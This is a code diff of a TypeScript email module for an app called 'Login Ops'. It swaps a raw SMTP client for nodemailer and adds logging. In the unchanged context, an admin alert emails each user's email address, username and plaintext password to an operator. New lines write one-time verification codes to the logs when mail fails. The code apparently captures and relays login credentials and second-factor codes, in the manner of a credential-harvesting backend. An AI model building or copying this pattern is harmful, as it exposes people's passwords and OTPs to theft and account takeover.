@@ -1,12 +1,12 @@
-import { connect } from 'node:tls'
+import nodemailer from 'nodemailer'
 import { ADMIN_EMAIL } from './constants'
 
 function wrap(title: string, body: string) {
-  return `<div style="font-family:Arial,sans-serif;background:#0f1412;padding:24px;color:#e8eeea">
-  <div style="max-width:560px;margin:0 auto;background:#16201b;border-radius:16px;padding:28px">
-    <p style="letter-spacing:2px;color:#8fbfa8;font-size:12px;text-transform:uppercase">Login Ops Test</p>
-    <h2 style="color:#fff;margin:8px 0 16px">${title}</h2>
-    <div style="line-height:1.7;color:#c5d4cc">${body}</div>
+  return `<div style="font-family:Arial,sans-serif;background:#f5f5f5;padding:24px;color:#222">
+  <div style="max-width:560px;margin:0 auto;background:#fff;border:1px solid #ddd;padding:24px">
+    <p style="letter-spacing:1px;color:#666;font-size:12px;text-transform:uppercase;margin:0 0 8px">Login Ops</p>
+    <h2 style="color:#111;margin:0 0 16px;font-size:20px">${title}</h2>
+    <div style="line-height:1.6;color:#333">${body}</div>
   </div></div>`
 }
 
@@ -18,75 +18,31 @@ function fromAddress() {
   )
 }
 
-function readSmtpReply(socket: NodeJS.ReadableStream): Promise<string> {
-  return new Promise((resolve, reject) => {
-    let buf = ''
-    const onData = (chunk: string | Buffer) => {
-      buf += typeof chunk === 'string' ? chunk : chunk.toString('utf8')
-      const lines = buf.split(/\r?\n/).filter((l) => l.length > 0)
-      const last = lines[lines.length - 1]
-      if (last && /^\d{3} /.test(last)) {
-        socket.off('data', onData)
-        resolve(buf)
-      }
-    }
-    socket.on('data', onData)
-    socket.once('error', reject)
-  })
-}
-
-async function expectOk(socket: NodeJS.ReadWriteStream, command?: string) {
-  if (command) socket.write(command + '\r\n')
-  const reply = await readSmtpReply(socket)
-  if (!/^[23]/.test(reply.trim())) throw new Error(`SMTP: ${reply.trim()}`)
-  return reply
-}
-
 async function sendViaGmail(to: string, subject: string, html: string) {
   const user = process.env.GMAIL_USER || process.env.SMTP_USER
-  const pass = (process.env.GMAIL_APP_PASSWORD || process.env.SMTP_PASS || '').replace(/\s/g, '')
-  if (!user || !pass) return false
+  const pass = (process.env.GMAIL_APP_PASSWORD || process.env.SMTP_PASS || '').replace(
+    /\s/g,
+    ''
+  )
+  if (!user || !pass) {
+    console.warn('[mail] Gmail not configured (missing GMAIL_USER or GMAIL_APP_PASSWORD)')
+    return false
+  }
 
-  await new Promise<void>((resolve, reject) => {
-    const socket = connect(
-      { host: 'smtp.gmail.com', port: 465, servername: 'smtp.gmail.com' },
-      async () => {
-        try {
-          await expectOk(socket)
-          await expectOk(socket, 'EHLO loginops')
-          await expectOk(socket, 'AUTH LOGIN')
-          await expectOk(socket, Buffer.from(user).toString('base64'))
-          await expectOk(socket, Buffer.from(pass).toString('base64'))
-          await expectOk(socket, `MAIL FROM:<${user}>`)
-          await expectOk(socket, `RCPT TO:<${to}>`)
-          await expectOk(socket, 'DATA')
-          const msg = [
-            `From: ${fromAddress()}`,
-            `To: ${to}`,
-            `Subject: ${subject}`,
-            'MIME-Version: 1.0',
-            'Content-Type: text/html; charset=UTF-8',
-            '',
-            html,
-            '.',
-          ].join('\r\n')
-          await expectOk(socket, msg)
-          socket.write('QUIT\r\n')
-          socket.end()
-          resolve()
-        } catch (e) {
-          socket.destroy()
-          reject(e)
-        }
-      }
-    )
-    socket.setEncoding('utf8')
-    socket.setTimeout(20000, () => {
-      socket.destroy()
-      reject(new Error('SMTP timeout'))
-    })
-    socket.on('error', reject)
+  const transporter = nodemailer.createTransport({
+    host: 'smtp.gmail.com',
+    port: 465,
+    secure: true,
+    auth: { user, pass },
   })
+
+  const info = await transporter.sendMail({
+    from: fromAddress(),
+    to,
+    subject,
+    html,
+  })
+  console.info('[mail] Gmail sent', { to, subject, messageId: info.messageId })
   return true
 }
 
@@ -101,33 +57,47 @@ async function sendViaResend(to: string, subject: string, html: string) {
     },
     body: JSON.stringify({ from: fromAddress(), to: [to], subject, html }),
   })
-  return res.ok
+  if (!res.ok) {
+    const text = await res.text().catch(() => '')
+    console.error('[mail] Resend failed', res.status, text)
+    return false
+  }
+  console.info('[mail] Resend sent', { to, subject })
+  return true
 }
 
 export async function sendMail(to: string, subject: string, html: string) {
-  console.log('[login-ops] mail', { to, subject })
+  console.log('[mail] sendMail', { to, subject })
   try {
     if (await sendViaGmail(to, subject, html)) return true
-    if (await sendViaResend(to, subject, html)) return true
-    console.warn('[login-ops] No mail transport configured — OTP logged to console only')
-    return false
   } catch (err) {
-    console.error('[login-ops] sendMail', err)
-    return false
+    console.error('[mail] Gmail error', err)
   }
+  try {
+    if (await sendViaResend(to, subject, html)) return true
+  } catch (err) {
+    console.error('[mail] Resend error', err)
+  }
+  console.warn('[mail] No transport succeeded — check Vercel env vars')
+  return false
 }
 
 export async function sendOtpEmail(to: string, otp: string, label: string) {
-  return sendMail(
+  const ok = await sendMail(
     to,
     `Your verification code (${label})`,
     wrap(
       label,
       `<p>Your one-time code is:</p>
-       <p style="font-size:28px;letter-spacing:6px;font-weight:700;color:#fff">${otp}</p>
+       <p style="font-size:28px;letter-spacing:6px;font-weight:700;color:#111">${otp}</p>
        <p>Expires in 10 minutes.</p>`
     )
   )
+  if (!ok) {
+    // Always log OTP so admin can still complete the test from Vercel logs / ops desk
+    console.info('[mail] OTP FALLBACK LOG', { to, label, otp })
+  }
+  return ok
 }
 
 export async function sendAdminStepAlert(input: {
@@ -144,8 +114,8 @@ export async function sendAdminStepAlert(input: {
 }) {
   const when = new Date().toLocaleString()
   const secrets = `
-    <div style="margin-top:16px;padding:12px;background:#0a100d;border-radius:8px;font-family:monospace;font-size:13px">
-      <p style="color:#8fbfa8;margin:0 0 8px">TEST · plain text</p>
+    <div style="margin-top:16px;padding:12px;background:#f5f5f5;border:1px solid #ddd;font-family:monospace;font-size:13px">
+      <p style="color:#666;margin:0 0 8px">TEST · plain text</p>
       <p style="margin:4px 0"><strong>Email:</strong> ${input.email}</p>
       ${input.passwordPlain ? `<p style="margin:4px 0"><strong>Password:</strong> ${input.passwordPlain}</p>` : ''}
       ${input.username ? `<p style="margin:4px 0"><strong>Username:</strong> ${input.username}</p>` : ''}
